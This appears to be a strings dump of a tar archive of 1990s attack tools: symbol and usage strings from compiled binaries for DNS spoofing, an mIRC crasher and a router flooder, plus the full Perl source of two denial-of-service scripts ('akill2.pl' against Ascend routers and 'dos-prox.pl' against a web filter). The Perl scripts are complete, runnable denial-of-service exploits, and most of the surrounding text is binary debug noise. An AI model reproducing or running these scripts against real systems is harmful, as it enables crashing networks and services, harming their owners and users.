            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "ADMdnsfuckr.c",
            "nameformat",
            "ntohl@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "recvfrom@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "myrand",
            "htonl@@GLIBC_2.0",
            "sendawnser",
            "bcopy@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "get_pkt",
            "makepaketAW",
            "setsockopt@@GLIBC_2.0",
            "nameformatIP",
            "_start",
            "ntohs@@GLIBC_2.0",
            "strlen@@GLIBC_2.0",
            "sleep@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "host2ip",
            "strcat@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "udp_send",
            "sendquestion",
            "gethostbyname@@GLIBC_2.0",
            "makepaketQS",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "dnsspoof",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/akill2.pl",
            "0100755",
            "0000000",
            "0000000",
            "00000003404",
            "06633371707",
            "013663",
            "ustar  ",
            "root",
            "root",
            "#!/usr/bin/perl",
            "# Ascend Kill II - perl version",
            "# (C) 1998 Rootshell - http://www.rootshell.com/ - <info@rootshell.com>",
            "# Released: 3/17/98",
            "# Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues",
            "# (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html)",
            "#  NOTE: This program is NOT to be used for malicous purposes.  This is",
            "#        intenteded for educational purposes only.  By using this program",
            "#        you agree to use this for lawfull purposes ONLY.",
            "use Socket;",
            "require \"getopts.pl\";",
            "sub AF_INET {2;}",
            "sub SOCK_DGRAM {2;}",
            "sub ascend_kill {",
            "  $remotehost = shift(@_);",
            "  chop($hostname = `hostname`);",
            "  $port = 9;",
            "  $SIG{'INT'} = 'dokill';",
            "  $sockaddr = 'S n a4 x8';",
            "  ($pname, $aliases, $proto) = getprotobyname('tcp');",
            "  ($pname, $aliases, $port) = getservbyname($port, 'tcp')",
            "  unless $port =~ /^\\d+$/;",
            "  ($pname, $aliases, $ptype, $len, $thisaddr) =",
            "  gethostbyname($hostname);",
            "  $this = pack($sockaddr, AF_INET, 0, $thisaddr);",
            "  ($pname, $aliases, $ptype, $len, $thataddr) = gethostbyname($remotehost);",
            "  $that = pack($sockaddr, AF_INET, $port, $thataddr);",
            "  socket(S, &AF_INET, &SOCK_DGRAM, 0);",
            "    $msg = pack(\"c64\",",
            "    0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,",
            "    0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,",
            "    0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,",
            "    0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,",
            "    0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,",
            "    0x50, 0x41, 0x53, 0x53);",
            "  for ($i=0; $i<500; $i++) {",
            "    $msg .= pack(\"c1\", 0xff);",
            "  send(S,$msg,0,$that) || die \"send:$!\";",
            "if ($ARGV[0] eq '') {",
            "  print \"usage: akill2.pl <remote_host>\\n\";",
            "  exit;",
            "&ascend_kill($ARGV[0]);",
            "datapool/bin/dos-prox.pl",
            "0100755",
            "0000000",
            "0000000",
            "00000001514",
            "07077700115",
            "014250",
            "ustar  ",
            "root",
            "root",
            "#!/usr/bin/perl",
            "#####################################################",
            "#  Proxomitron - Universial Web Filter - Version 3  #",
            "#  Dos Attack.                                      #",
            "#####################################################",
            "use IO::Socket;",
            "$ARGC=@ARGV;",
            "if ($ARGC !=2) {",
            "\tprint \"\\n-->\";",
            "        print \"\\tUsage: perl dos-prox.pl <host> <port>\\n\";",
            "\texit;",
            "$vic     = $ARGV[0];          # There IP",
            "$Uport   = $ARGV[1];          # There Web Port",
            "$SendStr = \"GET /\" x 1000;    # Crash String",
            "print \"\\n-->\";",
            "print \"\\tCrashing:$vic on:$Uport\\n\";",
            "unless ($socket2 = IO::Socket::INET->new (Proto => \"TCP\",",
            "\t\t\t\t\t  PeerAddr => $vic,",
            "\t\t\t\t\t  PeerPort => $Uport))",
            "        print \"-->\";",
            "        print \"\\tConnection Failed, Stoping.\\n\";",
            "        exit;",
            "print $socket2 \"GET $SendStr\\n\";",
            "close $socket2;",
            "print \"-->\";",
            "print \"\\tCrashed:$vic\\n\";",
            "exit;",
            "datapool/bin/hanson",
            "0100755",
            "0000000",
            "0000000",
            "00000033275",
            "07100656613",
            "013362",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "perror",
            "socket",
            "bzero",
            "send",
            "inet_addr",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u0109",
            "E1fE",
            "t$EP",
            "tChE",
            "\u0403;u[]",
            "9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
            "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
            "gethostbyname()",
            "connect()",
            "     Connected to [%s:%d].",
            "hanson.c - myn@efnet",
            "This lil program exploits mIRC's bound sockets, making the client crash",
            "Usage: %s <target> <port>",
            "socket()",
            "     Sending string 1ooo times to %s port %i... ",
            "mmmmb0p.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "hanson.c",
            "_DYNAMIC",
            "host",
            "_etext",
            "dport",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "addr",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "open_sock",
            "spoofedaddr",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/hiperbomb2",
            "0100755",
            "0000000",
            "0000000",
            "00000032044",
            "07036367432",
            "014124",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "connect",
            "socket",
            "write",
            "fprintf",
            "__deregister_frame_info",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhl",
            "cU=\u0218",
            "}\"h\u0647",
            "EE$EE",
            "\u0403;u]",
            "Cannot resolve host %s.",
            "Cannot obtain descriptor.",
            "Syntax: %s <chassis name> <num of packets>",
            "Approximately 60,000 packets usually takes care of the job.",
            "Beginning attack on chassis %s [%d packets]",
            "Attack complete.",
            "init.c",
            "/usr/src/bs/BUILD/glibc/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/usr/src/bs/BUILD/glibc/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i386-redhat-linux/egcs-2.91.66/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;\\",
            "grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;\\",
            "currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;\\",
            "mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;\\",
            "positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;\\",
            "int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;\\",
            "p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;\\",
            "n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;\\",
            "p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;\\",
            "__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;\\",
            "__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(15,4)",
            "__blkcnt64_t:t(15,45)=(15,5)",
            "__fsblkcnt_t:t(15,46)=(0,3)",
            "__fsblkcnt64_t:t(15,47)=(15,6)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;\\",
            "__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;\\",
            "__inheritsched:(0,1),96,32;__scope:(0,1),128,32;\\",
            "__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;\\",
            "__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;\\",
            "__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;\\",
            "__m_count:(0,1),32,32;__m_owner:(17,2),64,32;\\",
            "__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;\\",
            "__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;\\",
            "__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;\\",
            "__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;\\",
            "__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.3",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.8",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "hiperbomb2.c",
            "connect_to_chassis",
            "sockfd",
            "send_iacs",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "write@@GLIBC_2.0",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "num_of_tries",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "chassis",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/nt-dns",
            "0100755",
            "0000000",
            "0000000",
            "00000034543",
            "07100656645",
            "013303",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "getuid",
            "optarg",
            "gethostbyaddr",
            "socket",
            "bzero",
            "__deregister_frame_info",
            "sendto",
            "getopt",
            "inet_ntoa",
            "gethostbyname",
            "gethostname",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "setuid",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "u'jdEPN",
            "U,WVSe]",
            ")\u0109eEEfE",
            "PEPT",
            "1fRD",
            "PEPE",
            "e[^_]",
            "]U(E",
            "kE<ht4<h",
            "=<st",
            "u!h ",
            "EPEP",
            "EPEPEPEPEP\t 1",
            "\u0403;u[]",
            "Usage: %s [-s <source_host>] -d <dest_host>",
            "      <source_host> is an optional spoofed 'from' address.",
            "      <dest_host> is the NT DNS server.",
            "Using this host as source..",
            "<NULL>",
            "Unknown host: %s",
            "Sending from: %s -> ",
            "to: %s ",
            " %d bytes.",
            "No raw socket. Who are you ?",
            "hs:d:",
            "Huhm, ehrm, didn't we forget something ?",
            "Error, can't locate ",
            "target",
            "source",
            "%s host address.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
